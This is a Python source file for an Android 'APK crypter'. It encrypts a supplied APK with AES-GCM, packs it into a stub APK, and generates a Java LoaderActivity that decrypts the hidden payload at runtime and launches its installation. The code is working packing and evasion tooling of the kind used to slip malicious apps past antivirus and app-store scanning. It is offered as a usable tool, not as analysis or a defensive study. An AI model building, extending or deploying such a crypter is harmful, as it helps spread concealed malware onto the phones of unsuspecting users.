import logging
import secrets
import shutil
from pathlib import Path

from Crypto.Cipher import AES

from services.stub_builder import StubBuilder

logger = logging.getLogger(__name__)


class APKCrypter:
    PAYLOAD_MAGIC = b"CRUPTOANON"
    PAYLOAD_VERSION = 1
    PAYLOAD_AAD = b"CRUPTOANON:v1"

    def __init__(self):
        self.temp_dir = Path("temp")
        self.output_dir = Path("output")
        self.temp_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)
        self.aes_key = secrets.token_bytes(32)
        self.stub_builder = StubBuilder()
        logger.info("APKCrypter initialized")

    def encrypt_apk(self, apk_path: str) -> bytes:
        """Encrypt an APK into a versioned AES-GCM payload."""
        logger.info("Encrypting APK: %s", apk_path)
        with open(apk_path, "rb") as f:
            apk_data = f.read()

        logger.info("Original APK size: %s bytes", len(apk_data))

        nonce = secrets.token_bytes(12)
        cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
        cipher.update(self.PAYLOAD_AAD)
        ciphertext, tag = cipher.encrypt_and_digest(apk_data)

        encrypted = (
            self.PAYLOAD_MAGIC
            + bytes([self.PAYLOAD_VERSION])
            + nonce
            + tag
            + ciphertext
        )
        logger.info("Encrypted payload size: %s bytes", len(encrypted))
        return encrypted

    def create_crypted_apk(self, apk_path: str) -> str:
        """Create the final stub APK with the encrypted payload bundled inside."""
        original_name = Path(apk_path).stem
        logger.info("Creating crypted APK for: %s", original_name)

        encrypted_data = self.encrypt_apk(apk_path)
        logger.info("AES key: %s...", self.aes_key.hex()[:16])

        logger.info("Building stub APK...")
        stub_apk = self.stub_builder.build_stub_apk(
            self.aes_key.hex(),
            apk_path,
            encrypted_data,
        )
        logger.info("Stub APK built: %s", stub_apk)

        output_apk = self.output_dir / f"{original_name}_crypted.apk"
        shutil.copy(stub_apk, output_apk)
        logger.info("Crypted APK ready: %s", output_apk)

        return str(output_apk)

    def generate_loader_code(self) -> str:
        """Generate a standalone loader activity with the current payload format."""
        aes_key_hex = self.aes_key.hex()
        payload_magic = self.PAYLOAD_MAGIC.decode("ascii")
        payload_aad = self.PAYLOAD_AAD.decode("ascii")
        payload_version = self.PAYLOAD_VERSION

        return f'''package com.loader;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import androidx.core.content.FileProvider;
import java.io.*;
import java.nio.charset.StandardCharsets;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class LoaderActivity extends Activity {{

    private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
    private static final byte[] PAYLOAD_MAGIC = "{payload_magic}".getBytes(StandardCharsets.US_ASCII);
    private static final byte PAYLOAD_VERSION = (byte) {payload_version};
    private static final byte[] PAYLOAD_AAD = "{payload_aad}".getBytes(StandardCharsets.US_ASCII);

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        new Thread(() -> {{
            try {{
                InputStream is = getAssets().open("payload.bin");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {{
                    baos.write(buffer, 0, bytesRead);
                }}
                byte[] encryptedApk = baos.toByteArray();
                is.close();

                byte[] decryptedApk = decryptAES(encryptedApk);

                File tempApk = new File(getCacheDir(), "decrypted.apk");
                FileOutputStream fos = new FileOutputStream(tempApk);
                fos.write(decryptedApk);
                fos.close();

                runOnUiThread(() -> installApk(tempApk));
            }} catch (Exception e) {{
                e.printStackTrace();
                runOnUiThread(this::finish);
            }}
        }}).start();
    }}

    private byte[] decryptAES(byte[] encrypted) throws Exception {{
        if (encrypted.length < PAYLOAD_MAGIC.length + 1 + 12 + 16) {{
            throw new IOException("Payload too short");
        }}

        for (int i = 0; i < PAYLOAD_MAGIC.length; i++) {{
            if (encrypted[i] != PAYLOAD_MAGIC[i]) {{
                throw new IOException("Invalid payload header");
            }}
        }}

        int offset = PAYLOAD_MAGIC.length;
        if (encrypted[offset] != PAYLOAD_VERSION) {{
            throw new IOException("Unsupported payload version");
        }}
        offset += 1;

        byte[] nonce = new byte[12];
        System.arraycopy(encrypted, offset, nonce, 0, 12);
        offset += 12;

        byte[] tag = new byte[16];
        System.arraycopy(encrypted, offset, tag, 0, 16);
        offset += 16;

        byte[] ciphertext = new byte[encrypted.length - offset];
        System.arraycopy(encrypted, offset, ciphertext, 0, ciphertext.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
        cipher.updateAAD(PAYLOAD_AAD);

        byte[] input = new byte[ciphertext.length + tag.length];
        System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
        System.arraycopy(tag, 0, input, ciphertext.length, tag.length);

        return cipher.doFinal(input);
    }}

    private void installApk(File apkFile) {{
        Intent intent = new Intent(Intent.ACTION_VIEW);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
            Uri apkUri = FileProvider.getUriForFile(
                this,
                getPackageName() + ".fileprovider",
                apkFile
            );
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_URI_PERMISSION);
        }} else {{
            intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        }}

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }}

    private static byte[] hexToBytes(String hex) {{
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {{
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i + 1), 16));
        }}
        return data;
    }}
}}'''
